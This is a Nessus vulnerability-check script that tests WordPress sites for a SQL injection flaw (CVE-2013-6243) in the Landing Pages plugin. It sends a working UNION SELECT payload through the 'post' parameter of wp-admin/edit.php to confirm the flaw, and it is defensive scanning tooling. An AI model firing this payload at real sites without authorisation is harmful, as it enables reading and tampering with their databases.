#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(72152);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_cve_id("CVE-2013-6243");
  script_bugtraq_id(62942);
  script_osvdb_id(98334);

  script_name(english:"Landing Pages Plugin for WordPress 'wp-admin/edit.php' 'post' Parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'post' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WordPress Landing Pages plugin installed on the remote host is
affected by a SQL injection vulnerability due to a failure to properly
sanitize user-supplied input to the 'post' parameter of the
'wp-admin/edit.php' script. A remote, unauthenticated attacker can
leverage this issue to launch a SQL injection attack against the
affected application, leading to manipulation of data in the back-end
database or the disclosure of arbitrary data.");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/plugins/landing-pages/changelog/");
  script_set_attribute(attribute:"see_also", value:"https://plugins.trac.wordpress.org/changeset/785535/landing-pages");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.2.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/10/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/10/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/01/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:landing_pages_project:landing_pages_plugin");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Landing Pages";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "landing-pages/readme.txt"][0] =
    make_list('Landing Pages ===');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

time = unixtime();
token = rand() % 10000;

url2 = "/wp-admin/edit.php?";
payload = "post_type=landing-page&debug=1&post=2+UNION+SELECT+" +
  time + "," + token;

res2 = http_send_recv3(
  method       : "GET",
  item         : dir + url2 + payload,
  port         : port,
  exit_on_fail : TRUE
);
attack = http_last_sent_request();

if (
  '_wp_page_template' >< res2[2] &&
  token >< res2[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to verify the issue exists using the following'+
      '\n' + 'request : ' +
      '\n' +
      '\n' + attack +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
       '\n' + 'This produced the following output : ' +
       '\n' +
       '\n' + chomp(res2[2]) +
       '\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
